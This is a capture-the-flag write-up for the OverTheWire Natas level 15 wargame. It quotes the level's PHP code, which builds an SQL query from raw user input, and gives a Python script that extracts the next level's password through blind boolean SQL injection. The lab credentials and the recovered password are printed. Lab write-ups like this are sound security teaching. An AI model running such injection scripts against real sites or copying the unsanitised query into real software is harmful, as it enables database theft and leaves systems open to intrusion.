This level is also an SQL level. 

```php
<?php
/*
CREATE TABLE `users` (
	`username` varchar(64) DEFAULT NULL,
	`password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
	$link = mysqli_connect('localhost', 'natas15', '<censored>');
	mysqli_select_db($link, 'natas15');
	
	$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
	if(array_key_exists("debug", $_GET)) {
		echo "Executing query: $query<br>";
	}
	
	$res = mysqli_query($link, $query);
	if($res) {
		if(mysqli_num_rows($res) > 0) {
			echo "This user exists.<br>";
		} else {
			echo "This user doesn't exist.<br>";
		}
	} else {
		echo "Error in query.<br>";
	}
mysqli_close($link);
} else {
?>
```

This will check for user existence. If I try to input `natas16` into the input field, it says that `This user exists`. The query selects both fields of the `users` table. This won't show any database information to us, only 3 different types of response based on our query. If the query is correct and it returns a user, it would notify us that the user exists, else it will notify us that the user doesn't exist, otherwise the query is wrong.

For this, we can try brute forcing the password by using a python script:
```python
import requests
from requests.auth import HTTPBasicAuth

characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
correct_chars = ""
password = ""

# build a set of possible characters for password
print("Building charset...")
for char in characters:
    data = {"username" : 'natas16" and password LIKE BINARY "%' + char + '%" #'}
    response = requests.post("http://natas15.natas.labs.overthewire.org/index.php?debug", auth=HTTPBasicAuth("natas15", "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"), data=data)
    
    # check if query is correct
    if "exists" in response.text:
        correct_chars += char
        print(correct_chars)

# brute force the correct positions of the possible characters set (password size is 32)
print("Brute forcing...")
for i in range(0, 32):
    for char in correct_chars:
        data = {"username" : 'natas16" and password LIKE BINARY "' + password + char + '%" #'}
        response = requests.post("http://natas15.natas.labs.overthewire.org/index.php?debug", auth=HTTPBasicAuth("natas15", "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"), data=data)

        if "exists" in response.text:
            password += char
            print(password)
            break

print("natas16 password: " + password)
```

And here's the result: 
```py
natas16 password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
```